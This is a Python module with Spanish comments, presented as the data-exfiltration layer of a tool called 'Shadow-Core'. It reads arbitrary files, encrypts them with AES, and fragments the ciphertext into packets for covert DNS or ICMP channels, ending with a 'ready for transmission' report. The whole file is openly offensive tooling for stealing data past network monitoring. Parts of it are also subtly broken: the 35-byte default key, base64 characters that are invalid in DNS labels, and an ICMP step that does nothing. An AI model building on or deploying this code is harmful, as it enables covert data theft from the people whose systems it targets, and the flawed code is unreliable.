"""
data_exfiltration_layer.py - Módulo de exfiltración encriptada
Cifrado AES-256 + fragmentación para canales DNS/ICMP
Integrado como módulo del Shadow-Core
"""

import os
import json
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from pathlib import Path
from typing import List

# --- CONFIGURACIÓN ---
AES_KEY = os.environ.get('AURA_EXFIL_KEY', b'my_super_secret_key_32_bytes_long!!')
if isinstance(AES_KEY, str):
    AES_KEY = AES_KEY.encode()
KNOWLEDGE_BASE_PATH = Path("./knowledge_base")
CHUNK_SIZE = 1024


def encrypt_data(data: bytes, key: bytes) -> bytes:
    """Cifra datos usando AES-256 en modo CBC."""
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    iv = cipher.iv
    return iv + ct_bytes


def prepare_for_dns_exfil(encrypted_chunk: bytes) -> List[str]:
    """Prepara un chunk cifrado para exfiltración por DNS."""
    encoded_chunk = base64.b64encode(encrypted_chunk).decode('utf-8')
    max_label_len = 50
    packets = [encoded_chunk[i:i+max_label_len] for i in range(0, len(encoded_chunk), max_label_len)]
    return packets


def prepare_for_icmp_exfil(encrypted_chunk: bytes) -> bytes:
    """Prepara un chunk cifrado para exfiltración por ICMP."""
    return encrypted_chunk


def exfiltrate_file(filepath: Path, channel: str = "dns"):
    """Toma un archivo, lo encripta, lo fragmenta y lo prepara para exfiltración."""
    if not filepath.exists():
        return {"status": "error", "message": f"Archivo {filepath} no existe"}

    with open(filepath, "rb") as f:
        file_data = f.read()

    encrypted_data = encrypt_data(file_data, AES_KEY)
    exfil_packets = []
    total_chunks = 0

    for i in range(0, len(encrypted_data), CHUNK_SIZE):
        chunk = encrypted_data[i:i+CHUNK_SIZE]
        total_chunks += 1

        if channel == "dns":
            packets = prepare_for_dns_exfil(chunk)
            exfil_packets.extend(packets)
        elif channel == "icmp":
            packet = prepare_for_icmp_exfil(chunk)
            exfil_packets.append(packet)

    return {
        "status": "prepared",
        "channel": channel,
        "file": str(filepath),
        "original_size": len(file_data),
        "encrypted_size": len(encrypted_data),
        "total_chunks": total_chunks,
        "total_packets": len(exfil_packets),
        "note": "Shadow-Core: paquetes listos para transmisión"
    }


def prepare_exfil_report(data: dict) -> str:
    """Genera reporte JSON de exfiltración."""
    return json.dumps(data, indent=2, default=str)